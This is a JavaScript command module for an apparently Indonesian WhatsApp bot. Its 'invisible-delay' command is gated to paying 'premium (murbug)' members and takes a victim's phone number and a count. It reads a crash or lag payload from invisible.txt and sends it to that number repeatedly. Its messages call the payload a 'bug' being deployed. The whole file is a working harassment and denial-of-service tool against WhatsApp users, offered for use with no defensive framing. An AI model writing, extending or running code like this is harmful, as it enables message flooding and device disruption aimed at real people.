const fs = require('fs');
const path = require('path');

module.exports = {
    command: 'invisible-delay',
    execute: async (sock, m, { args, reply, isPremium }) => {
        if (!isPremium) return reply("Fitur ini khusus untuk member premium (murbug).");
        
        const nomor = args[0];
        const jumlah = parseInt(args[1]) || 5;
        const INVIS_FILE = './invisible.txt';

        if (!nomor) return reply("Penggunaan: .invisible-delay [nomor] [jumlah]\nContoh: .invisible-delay 6281234567890 10");

        const target = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        try {
            if (!fs.existsSync(INVIS_FILE)) return reply("File payload invisible.txt tidak ditemukan.");
            
            const payload = fs.readFileSync(INVIS_FILE, 'utf-8');
            const finalChat = '⿻ 𝐌𝐚𝐫𝐢𝐧 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫\n' + payload;

            await reply(`Deploying invisible delay to ${target}...`);

            for (let i = 0; i < jumlah; i++) {
                await sock.sendMessage(target, { text: finalChat }, { quoted: m });
            }

            reply(`Invisible delay delivered to ${target}`);
        } catch (err) {
            reply("Gagal mengirim bug: " + err.message);
        }
    }
};
